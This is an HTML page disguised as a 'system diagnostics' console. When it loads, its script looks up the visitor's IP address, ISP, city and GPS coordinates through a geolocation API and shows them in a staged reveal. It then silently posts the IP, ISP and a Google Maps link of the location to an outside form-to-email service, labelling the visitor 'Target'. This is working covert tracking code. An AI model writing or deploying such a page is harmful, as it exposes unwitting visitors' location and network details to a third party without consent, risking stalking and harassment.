<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM_DIAGNOSTICS</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #console { max-width: 600px; margin: 20px auto; border: 1px solid #0f0; padding: 15px; min-height: 300px; background: #050505; box-shadow: 0 0 15px #0f0; }
        .line { margin-bottom: 8px; font-size: 14px; }
        .blue { color: #0cf; }
    </style>
</head>
<body>

<div id="console">> [SYS] INITIALIZING_SCAN...</div>

<script>
    var consoleBox = document.getElementById('console');

    function log(text, color) {
        var div = document.createElement('div');
        div.className = "line";
        if (color) div.style.color = color;
        div.innerHTML = "> " + text;
        consoleBox.appendChild(div);
    }

    // 1. Get Data
    fetch('https://ipapi.co/json/')
    .then(function(res) { return res.json(); })
    .then(function(data) {
        
        // 2. The Slow Reveal
        setTimeout(function() { log("NODE_FOUND: " + data.ip, "#0cf"); }, 1000);
        setTimeout(function() { log("ISP: " + data.org, "#0cf"); }, 2000);
        setTimeout(function() { log("LOCATION: " + data.city + ", " + data.region, "#0cf"); }, 3000);
        setTimeout(function() { log("GPS: " + data.latitude + ", " + data.longitude, "#0cf"); }, 4000);
        setTimeout(function() { log("STATUS: LOGGED_TO_REMOTE", "#ff0"); }, 5000);

        // 3. Send Email
        setTimeout(function() {
            fetch("https://formsubmit.co/ajax/jabuvo", {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    Target: data.ip,
                    ISP: data.org,
                    Map: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
                })
            });
        }, 5500);
    })
    .catch(function(err) {
        log("ERROR: CONNECTION_FAILED", "red");
    });
</script>
</body>
</html>
